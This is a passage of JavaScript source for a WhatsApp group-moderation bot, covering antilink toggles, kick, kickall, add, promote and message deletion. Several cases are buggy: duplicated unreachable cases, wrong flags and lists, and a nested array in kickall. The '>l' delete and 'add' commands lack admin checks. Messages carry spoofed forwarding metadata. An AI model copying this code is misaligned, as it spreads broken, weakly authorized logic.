                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
                    case 'antilinktiktok': case 'antilinktt': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (AntiLinkTiktok) return replynano('Already activated')
        ntilinktt.push(from)
        fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
        replynano('Success in turning on tiktok antilink in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!AntiLinkTiktok) return replynano('Already deactivated')
        let off = ntilinktt.indexOf(from)
        ntilinktt.splice(off, 1)
        fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
        replynano('Success in turning off tiktok antilink in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
                    case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (AntiLinkTwitter) return replynano('Already activated')
        ntilinktwt.push(from)
        fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
        replynano('Success in turning on twitter antilink in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!AntiLinkTwitter) return replynano('Already deactivated')
        let off = ntilinktwt.indexOf(from)
        ntilinktwt.splice(off, 1)
        fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
        replynano('Success in turning off twitter antilink in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
                      case 'antilink': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The Bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Specifically for admins!!')
        if (args[0] === "on") {
        if (AntiLinkTwitter) return replynano('Already activated')
        ntilinkall.push(from)
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
        replynano('Success in turning on all antilink in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!AntiLinkAll) return replynano('Already deactivated')
        let off = ntilinkall.indexOf(from)
        ntilinkall.splice(off, 1)
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
        replynano('Success in turning off all antilink in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hai ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
        case 'antitoxic': case 'antibadword': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (antiToxic) return replynano('Already activated')
        nttoxic.push(from)
        fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
        replynano('Success in turning on antitoxic in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!antiToxic) return replynano('Already deactivated')
        let off = nttoxic.indexOf(from)
        nttoxic.splice(off, 1)
        fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
        replynano('Success in turning off antitoxic in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
        case 'antiwame': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (antiWame) return replynano('Already activated')
        ntwame.push(from)
        fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
        replynano('Success in turning on antiwame in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!antiWame) return replynano('Already deactivated')
        let off = nttoxic.indexOf(from)
        ntwame.splice(off, 1)
        fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
        replynano('Success in turning off antiwame in this group')
        } else {
          let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break
        case 'antilink':
        case 'antilinkgc': {
        if (!m.isGroup) return reply(mess.only.group)
        if (!isBotAdmins) return reply('_The bot should be the admin first_')
        if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
        if (args[0] === "on") {
        if (Antilinkgc) return replynano('Already activated')
        ntlinkgc.push(from)
        fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
        replynano('Success in turning on antiwame in this group')
        var groupe = await NanoBotz.groupMetadata(from)
        var members = groupe['participants']
        var mems = []
        members.map(async adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
        } else if (args[0] === "off") {
        if (!Antilinkgc) return replynano('Already deactivated')
        let off = ntlinkgc.indexOf(from)
        ntlinkgc.splice(off, 1)
        fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
        replynano('Success in turning off antiwame in this group')
        } else {
        let msg = generateWAMessageFromContent(from, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `Hi ${pushname}\nPlease click the button below to use _*${command}*_ command`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: `{
                        "title":"SELECT ON/OFF ♨️",
                        "sections":[{
                          "title":"SELECT ON/OFF ",
                          "rows":[{
                            "header":"TURN IT ON 🚹",
                            "title":"CHOOSE ",
                            "description":"ON 🚹",
                            "id":"${prefix + command} on"
                          },
                          {
                            "header":"OFF ❌",
                            "title":"CHOOSE ",
                            "description":"OFF ❌",
                            "id":"${prefix + command} off"
                          }]
                        }]
                      }`
                    }
                  ]
                }),
                contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363303045895814@newsletter',
                    newsletterName: ownername,
                    serverMessageId: 143
                  }
                }
              })
            }
          }
        }, { quoted: m });
        
        await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id
        });
          }
          }
          break

case 'antilink':
case 'antilinkgc': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (Antilinkgc) return replynano('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replynano('Success in turning on antiwame in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replynano('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replynano('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `HEY ${pushname}\nPlease click the button below to use _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"TURN ON/OFF ♨️",
                "sections":[{
                  "title":"TURN ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN 🚹",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN 🚹",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363303045895814@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
  
   case 'leavegc': case 'left': {
if (!DanzTheCreator) return reply(mess.only.owner)
await NanoBotz.groupLeave(m.chat)
await replynano(`Done`)
            }
            break
case 'add': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'add')
await replynano(`Done`)
}
break
case 'closetime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replynano('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replynano(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
NanoBotz.groupSettingUpdate(from, 'announcement')
replynano(close)
}, timer)
}
break
          

            case 'delete': case 'del': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!m.quoted) throw false
let { chat, id } = m.quoted
 NanoBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case '>l': {
if (!m.quoted) throw false
let { chat, id } = m.quoted
 NanoBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
let response = await NanoBotz.groupInviteCode(m.chat)
NanoBotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replynano('The message was not sent by a bot!')
                 NanoBotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'opentime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replynano('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replynano(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
NanoBotz.groupSettingUpdate(from, 'not_announcement')
replynano(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'remove')
await replynano(`Done`)
}
break
//=========================================\\
case 'kickall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
const users = participants.map(a => a.id)
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'remove')
await replynano(`Done`)
}
break
case 'setbotname':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (!text) return replynano(`Where is the name?\nExample: ${prefix + command} Patron-md`)
    await NanoBotz.updateProfileName(text)
    replynano(`Success in changing the name of bot's number`)
    }
    break
case 'setbotbio':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (!text) return replynano(`Dimana teksnya?\nExample: ${prefix + command} Patron-md`)
    await NanoBotz.updateProfileStatus(text)
    replynano(`Success in changing the bio of bot's number`)
    }
    break
   case 'setnamegc': case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins) return reply('Admin only!!')
if (!text) return replynano('Text ?')
await NanoBotz.groupUpdateSubject(m.chat, text)
await replynano(`Done`)
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins) return reply('Admin only!!')
if (!text) return replynano('Text ?')
await NanoBotz.groupUpdateDescription(m.chat, text)
await replynano(`Done`)
            }
            break
//=========================================\\
case 'getpp':{
if (!m.isGroup) return reply ("Used Specially in group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await NanoBotz.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
NanoBotz.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!quoted) return replynano(`Where is the picture?`)
if (!/image/.test(mime)) return replynano(`Send/Reply Pictures with Caption ${prefix + command}`)
if (/webp/.test(mime)) return replynano(`Send/Reply Pictures with Caption ${prefix + command}`)
var mediz = await NanoBotz.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await NanoBotz.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replynano(`Success`)
} else {
var memeg = await NanoBotz.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replynano(`Success`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
    await NanoBotz.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!DanzTheCreator) return reply(mess.only.owner)
    await NanoBotz.removeProfilePicture(NanoBotz.user.id)
    replynano(`Success in deleting bot's profile picture`)
    }
    break
case 'promote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'promote')
await replynano(`Done`)
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await NanoBotz.groupParticipantsUpdate(m.chat, [users], 'demote')
await replynano(`Done`)
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
NanoBotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'ht': {
if (!m.isGroup) return reply(mess.only.group)
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
               if (!m.quoted) return replynano(`Reply message with caption ${prefix + command}`)
               NanoBotz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DanzTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
me = m.sender
